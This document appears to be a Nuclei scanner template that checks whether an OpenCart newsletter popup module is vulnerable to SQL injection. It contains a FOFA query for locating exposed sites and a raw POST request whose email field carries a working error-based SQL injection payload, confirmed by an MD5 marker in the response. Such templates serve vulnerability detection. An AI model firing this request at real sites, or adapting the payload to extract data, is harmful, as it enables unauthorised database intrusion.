id: opencart-mokuai-newsletter-sqli

info:
  name: opencart-mokuai-newsletter-sqli
  author: HackTwo
  severity: high
  description: opencart 通讯模块 newsletter 存在sql注入漏洞。
  tags: bgk,sqli
  metadata:
    fofa-qeury: body="extension/module/so_newletter_custom_popup/newsletter"

http:
  - raw:
      - |              
        POST /index.php?route=extension/module/so_newletter_custom_popup/newsletter HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0

        createdate=2022-8-28 19:4:6&email=hi' AND (SELECT 4828 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT md5(123)),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#&status=0

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains(body, "202cb962ac59075b964b07152d234b70") && contains(header, "text/html")'